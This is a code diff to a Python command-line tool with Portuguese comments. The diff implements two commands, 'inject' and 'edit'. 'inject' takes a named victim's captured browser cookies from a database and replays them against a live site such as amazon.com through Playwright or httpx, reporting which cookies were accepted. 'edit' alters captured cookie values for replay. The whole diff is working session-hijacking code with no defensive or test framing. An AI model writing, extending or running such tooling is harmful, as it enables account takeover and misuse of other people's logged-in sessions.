@@ -171,27 +171,79 @@ def cookies(db_path: Path, victim: int, domain: str, scheme: str, req_path: str,
     console.print(f"[dim]Total: {len(matched)} cookies aplicáveis[/]")
 
 
-# ---- Stubs das fases seguintes ----
+# ---- Fase M2 (injeção & edição) ----
 
 @cli.command()
-@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db")
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
+@click.option("--victim", type=int, required=True)
+@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
+@click.option("--url", required=True, help="URL a abrir (ex.: https://www.amazon.com)")
+@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
+              default="playwright", show_default=True)
+@click.option("--path", "req_path", default="/", show_default=True)
+@click.option("--screenshot", "shot_dir", type=click.Path(path_type=Path), default=None,
+              help="Diretorio para salvar screenshot (Playwright)")
+def inject(db_path: Path, victim: int, domain: str, url: str, channel: str,
+           req_path: str, shot_dir: Path):
+    """Injeta os cookies da vítima num contexto de requisição e reporta o envio."""
+    from .domain.matcher import applicable_cookies
+    from .inject.capture import summarize_sent
+    from .inject import httpx_client, playwright_client
+
+    store = _load_store(str(db_path))
+    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
+    scheme = "http" if url.startswith("http://") else "https"
+    host = domain.split("://")[-1].strip("/")
+    cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)
+
+    if not cookies:
+        console.print(f"[yellow]Nenhum cookie aplicável para {scheme}://{host}{req_path}[/]")
+        return
+
+    console.print(f"[bold]{len(cookies)} cookies aplicáveis; canal={channel}[/]")
+
+    if channel == "httpx":
+        result = httpx_client.get(url, cookies)
+        result["sent_cookies"] = []
+    else:
+        shot_path = None
+        if shot_dir:
+            shot_dir.mkdir(parents=True, exist_ok=True)
+            shot_path = shot_dir / f"victim_{victim}_{host}.png"
+        result = playwright_client.replay(url, cookies, screenshot_path=shot_path)
+
+    if result.get("error"):
+        console.print(f"[red]Erro no replay: {result['error']}[/]")
+        return
+
+    console.print(f"status={result.get('status_code')} final={result.get('final_url')}")
+
+    if channel == "playwright":
+        injected_names = [c["name"] for c in cookies]
+        summary = summarize_sent(result, injected_names)
+        console.print(f"[green]Enviados ao alvo ({len(summary['sent'])}):[/] "
+                      + ", ".join(summary["sent"]) if summary["sent"] else "")
+        if summary["not_sent"]:
+            console.print(f"[dim]Não enviados ({len(summary['not_sent'])}):[/] "
+                          + ", ".join(summary["not_sent"]))
+        if result.get("screenshot"):
+            console.print(f"[dim]Screenshot: {result['screenshot']}[/]")
+
+
+@cli.command()
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
 @click.option("--victim", type=int, required=True)
 @click.option("--domain", required=True)
-@click.option("--url", required=True)
-@click.option("--channel", type=click.Choice(["httpx", "playwright"]), default="playwright")
-def inject(db_path: Path, victim: int, domain: str, url: str, channel: str):
-    """[M2] Injeta os cookies da vítima num contexto de requisição."""
-    console.print("[yellow]Não implementado - previsto na fase M2 (injeção & edição).[/]")
-
-
-@cli.command()
-@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db")
-@click.option("--victim", type=int, required=True)
-@click.option("--cookie", required=True)
-@click.option("--value", required=True)
-def edit(db_path: Path, victim: int, cookie: str, value: str):
-    """[M2] Altera o valor de um cookie capturado (replay de artefato editado)."""
-    console.print("[yellow]Não implementado - previsto na fase M2 (injeção & edição).[/]")
+@click.option("--cookie", required=True, help="Nome do cookie a alterar")
+@click.option("--value", required=True, help="Novo valor")
+def edit(db_path: Path, victim: int, domain: str, cookie: str, value: str):
+    """Altera o valor de um cookie capturado (replay de artefato editado)."""
+    store = _load_store(str(db_path))
+    n = store.update_cookie_value(victim, domain, cookie, value)
+    console.print(f"[green]Atualizadas {n} linha(s) de '{cookie}[/]' "
+                  f"para vítima {victim}@{domain}")
 
 
 @cli.command()
